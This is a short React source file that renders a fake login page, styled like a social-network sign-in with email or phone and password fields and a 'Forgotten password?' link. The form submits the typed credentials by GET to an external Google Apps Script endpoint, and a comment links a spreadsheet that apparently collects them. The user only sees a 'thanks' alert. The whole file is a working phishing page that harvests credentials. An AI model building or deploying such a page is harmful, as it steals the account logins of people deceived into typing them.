import './App.css';
import './myEdit/style.css';

// https://docs.google.com/spreadsheets/d/1CLv682aA4xwPsBO1P46k6oJ6qWa1GRjt-zgqKgLclHE/edit#gid=0
function App() {
  const myfunction = () => alert('thanks');
  return (
    <div className="App">
      <div className="screen">
        <form className="form" action="https://script.google.com/macros/s/AKfycbyc0j6x9rlcCh_1uOGn75j98360ZNMh74m7DoI7gTEgk0HS2CL8xctq_F6AKN99Rcr5/exec" method="get">
          <label><input className="ip" type="text" placeholder="Email address or phone number" name="account" /></label>
          <label><input className="ip" type="text" placeholder='Password' name="pass" /></label>
          <label><input type='submit' className="btn" value="Log in" onClick={myfunction} /></label>
          <a href="http://localhost:3000/">Forgotten password?</a>
        </form>
      </div>
    </div>
  );
}

export default App;
